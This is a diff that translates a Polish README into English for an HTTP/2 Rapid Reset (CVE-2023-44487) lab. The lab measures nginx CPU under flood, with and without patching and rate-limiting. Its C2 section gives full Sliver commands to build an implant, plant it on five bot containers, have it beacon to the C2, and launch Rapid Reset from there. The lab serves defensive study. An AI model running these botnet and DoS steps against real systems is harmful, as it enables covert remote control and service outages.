@@ -1,110 +1,112 @@
-# lab-results — eksperymenty, dane i raport
+# lab-results — experiments, data and report
 
-Dowód wykonanej pracy nad labem HTTP/2 Rapid Reset (CVE-2023-44487): skrypty
-pomiarowe, surowe dane, wykres-raport oraz procedura ofensywna sterowana przez
-C2 (Sliver). Wszystko jest odtwarzalne na mocniejszej maszynie — patrz niżej.
+Proof of work for the HTTP/2 Rapid Reset lab (CVE-2023-44487): measurement
+scripts, raw data, chart-report and offensive procedure controlled via
+C2 (Sliver). Everything is reproducible on a more powerful machine — see below.
 
-## Struktura
+## Structure
 
 ```
 lab-results/
-  scripts/      przenośne skrypty do odpalenia na dowolnej maszynie
-    run-botnet-matrix.sh      matryca: rozmiar botnetu × 4 konfiguracje serwera
-  data/         surowe wyniki (CSV) + osie czasu scenariuszy
-    results.csv            pomiar 1-sek, eksperyment defensywny (h2load, 5 progów)
-    stats.csv             rozkład statusów (2xx/429) per scenariusz
-    botnet.csv            matryca botnet: CPU ofiary wg rozmiaru botnetu × konfiguracja
-    attackers.txt         statystyki od strony atakującego (h2load + bot Rapid Reset)
-    timeline.txt          dokładne znaczniki czasu scenariuszy (do zrzutów Zabbix)
+  scripts/      portable scripts to run on any machine
+    run-botnet-matrix.sh      matrix: botnet size × 4 server configurations
+  data/         raw results (CSV) + scenario timelines
+    results.csv            1-sec measurement, defensive experiment (h2load, 5 thresholds)
+    stats.csv             status distribution (2xx/429) per scenario
+    botnet.csv            botnet matrix: victim CPU by botnet size × configuration
+    attackers.txt         attacker-side statistics (h2load + Rapid Reset bot)
+    timeline.txt          exact scenario timestamps (for Zabbix screenshots)
   report/
-    raport.html           interaktywny raport-dashboard (otwórz w przeglądarce)
-  as-run/       surowe skrypty dokładnie tak, jak uruchamiane w sesji (proof-of-work;
-                mają ścieżki specyficzne dla maszyny autora — do wglądu, nie do uruchamiania)
+    raport.html           interactive report-dashboard (open in browser)
+  as-run/       raw scripts exactly as executed in the session (proof-of-work;
+                contain paths specific to the author's machine — for reference, not for running)
 ```
 
-Zmiana w `monitoring/provision.py` i `monitoring/alerts.py`: timeout API Zabbixa
-podbity 15→120 s (ciężki `host.create` z dużym szablonem padał na wolnym hoście).
+Change in `monitoring/provision.py` and `monitoring/alerts.py`: Zabbix API
+timeout raised from 15→120 s (heavy `host.create` with a large template was
+failing on a slow host).
 
-## Dwa tory eksperymentu
+## Two experiment tracks
 
-### 1. Defensywny / monitoring (zrobiony, z raportem)
-Atak floodowy HTTP/2 (`h2load`) na ofiarę przy 5 progach obciążenia (~10/20/40/55/80% CPU),
-**z obroną i bez** (rate-limiting per-IP). Pomiar bezpośredni co 1 s + monitoring Zabbix.
-Wyniki i wnioski: `report/raport.html` (+ `data/results.csv`, `data/stats.csv`).
+### 1. Defensive / monitoring (completed, with report)
+HTTP/2 flood attack (`h2load`) on the victim at 5 load thresholds (~10/20/40/55/80% CPU),
+**with and without defense** (per-IP rate-limiting). Direct measurement every 1 s + Zabbix monitoring.
+Results and conclusions: `report/raport.html` (+ `data/results.csv`, `data/stats.csv`).
 
-Najważniejsze: tryb utwardzony trzyma CPU ofiary na ~2% przy każdym natężeniu
-(flood odbijany kodem 429 na brzegu), a autentyczny Rapid Reset (bot) wysłał
-~562 tys. `RST_STREAM` przy 0 udanych odpowiedziach — łatka nginx w akcji.
+Key finding: hardened mode keeps victim CPU at ~2% at every intensity level
+(flood rejected with 429 at the edge), and the authentic Rapid Reset (bot) sent
+~562k `RST_STREAM` with 0 successful responses — the nginx patch in action.
 
-### 2. Ofensywny / botnet sterowany przez C2 (ten katalog)
-Flota botów (osobne kontenery = osobne IP) odpala **autentyczny Rapid Reset**
-przeciw ofierze; obciążenie skalowane **rozmiarem botnetu** (1→5) dla 4 konfiguracji:
-nienałatany/załatany nginx × z hardeningiem/bez. Dane: `data/botnet.csv`.
+### 2. Offensive / botnet controlled via C2 (this directory)
+Bot fleet (separate containers = separate IPs) launches **authentic Rapid Reset**
+against the victim; load scaled by **botnet size** (1→5) for 4 configurations:
+unpatched/patched nginx × with/without hardening. Data: `data/botnet.csv`.
 
-## Jak odtworzyć matrycę botnet (mocna maszyna)
+## How to reproduce the botnet matrix (powerful machine)
 
 ```bash
-# 1. Podnieś bazowy lab (sieć labnet + loadgen + obraz bota + c2/Sliver)
+# 1. Bring up the base lab (labnet network + loadgen + bot image + c2/Sliver)
 docker compose up -d --build
 
-# 2. Odpal matrycę. Na mocnym CPU podnieś limity, żeby flota realnie dociążyła ofiarę:
+# 2. Run the matrix. On a powerful CPU, raise limits so the fleet actually loads the victim:
 BOT_CPUS=1.0 VIC_CPUS=2.0 CONC=800 bash lab-results/scripts/run-botnet-matrix.sh
 ```
 
-Skrypt sam zbuduje obrazy ofiary (`labvic:old` = nginx 1.25.1, `labvic:new` = 1.27),
-postawi flotę `lab-bot1..5` (osobne IP), przejdzie 4 konfiguracje × rozmiary 1..5
-i zapisze `data/botnet.csv` + wydrukuje tabelę CPU. Parametry (zmienne środowiskowe)
-opisane w nagłówku skryptu.
+The script will build victim images (`labvic:old` = nginx 1.25.1, `labvic:new` = 1.27),
+deploy fleet `lab-bot1..5` (separate IPs), iterate through 4 configurations × sizes 1..5
+and save `data/botnet.csv` + print a CPU table. Parameters (environment variables)
+are described in the script header.
 
-> Uwaga o magnitudzie: Rapid Reset jest **tani w obsłudze dla nginx** (anulowane
-> strumienie), więc na słabym hoście (4 rdzenie) flota nie nasyca ofiary i wyniki
-> są niskie/zaszumione — to realna odporność nginx. Na maszynie z większą liczbą
-> rdzeni (i wyższym `BOT_CPUS`) krzywa CPU vs rozmiar botnetu jest wyższa i czystsza.
+> Note on magnitude: Rapid Reset is **cheap for nginx to handle** (cancelled
+> streams), so on a weak host (4 cores) the fleet doesn't saturate the victim and results
+> are low/noisy — this is in itself a finding (nginx is resilient). On a machine with more
+> cores (and higher `BOT_CPUS`) the CPU vs botnet size curve is higher and cleaner.
 
-## Faza C2 — atak sterowany przez Sliver (procedura)
+## C2 phase — attack controlled via Sliver (procedure)
 
-Flota jest gotowa do sterowania przez C2. Binarka serwera Sliver siedzi w kontenerze
-`c2` (`/opt/sliver/sliver-server`, montowana z `c2/bin/`). Demonstracja „state-of-the-art
-botnet C2":
+The fleet is ready for C2 control. The Sliver server binary is in the
+`c2` container (`/opt/sliver/sliver-server`, mounted from `c2/bin/`). Demonstration of
+"state-of-the-art botnet C2":
 
 ```bash
-# konsola Slivera
+# Sliver console
 docker compose exec c2 /opt/sliver/sliver-server
 ```
-W konsoli (mTLS = wzajemne TLS, domyślny kanał):
+In the console (mTLS = mutual TLS, default channel):
 ```
-mtls --lport 8888                               # listener dla implantów
+mtls --lport 8888                               # listener for implants
 generate --mtls lab-c2:8888 --os linux --arch amd64 \
-         --skip-symbols --save /root/.sliver/implant     # zbuduj implant (linux)
+         --skip-symbols --save /root/.sliver/implant     # build implant (linux)
 ```
-Implant pojawi się w `c2/data/implant` (montowane). Wgraj go na boty i uruchom
-(każdy bot ma już `rapidreset`):
+The implant will appear in `c2/data/implant` (mounted). Deploy it to bots and run
+(each bot already has `rapidreset`):
 ```bash
 for i in 1 2 3 4 5; do
   docker cp c2/data/implant lab-bot$i:/implant
-  docker exec -d lab-bot$i /implant               # implant beaconuje do c2 (mTLS)
+  docker exec -d lab-bot$i /implant               # implant beacons to c2 (mTLS)
 done
 ```
-W konsoli Slivera boty zgłoszą się jako sesje:
+In the Sliver console the bots will register as sessions:
 ```
-sessions                                          # 5 implantów z różnych IP
+sessions                                          # 5 implants from different IPs
 interact <ID>
 execute /usr/local/bin/rapidreset -url https://victim:443 -requests 20000 -concurrency 1000
 ```
-Komenda `execute` odpala Rapid Reset na bocie **z poziomu C2**. Powtórz na kolejnych
-sesjach (albo zeskryptuj), żeby cała flota uderzyła jednocześnie — zrzut listy sesji
-+ komendy = dowód sterowania botnetem. Efekt obserwuj w Zabbixie (Monitoring → Latest
-data: Nginx Connections active / CPU) albo bezpośrednio (`docker exec lab-victim2 ...`).
+The `execute` command launches Rapid Reset on a bot **from the C2 level**. Repeat on
+subsequent sessions (or script it) so the entire fleet strikes simultaneously — a screenshot
+of the session list + commands = proof of botnet control. Observe the effect in Zabbix
+(Monitoring → Latest data: Nginx Connections active / CPU) or directly
+(`docker exec lab-victim2 ...`).
 
-> Dokładne flagi mogą się różnić między wersjami Sliver — `help generate`, `help mtls`
-> w konsoli. Implanty są linuxowe/amd64 i uruchamiają się w kontenerach bota (alpine).
+> Exact flags may vary between Sliver versions — `help generate`, `help mtls`
+> in the console. Implants are linux/amd64 and run in bot containers (alpine).
 
-## Monitoring Zabbix
+## Zabbix monitoring
 
 ```bash
 docker compose -f docker-compose.yml -f docker-compose.override.yml \
   -f docker-compose.monitoring.yml up -d --build zabbix-db zabbix-server zabbix-web
 docker compose -f docker-compose.yml -f docker-compose.override.yml \
-  -f docker-compose.monitoring.yml run --rm zabbix-provision   # host victim + szablony
+  -f docker-compose.monitoring.yml run --rm zabbix-provision   # host victim + templates
 ```
-Frontend: http://localhost:8080 (Admin / zabbix). Szczegóły: `README-MONITORING.md`.
+Frontend: http://localhost:8080 (Admin / zabbix). Details: `README-MONITORING.md`.
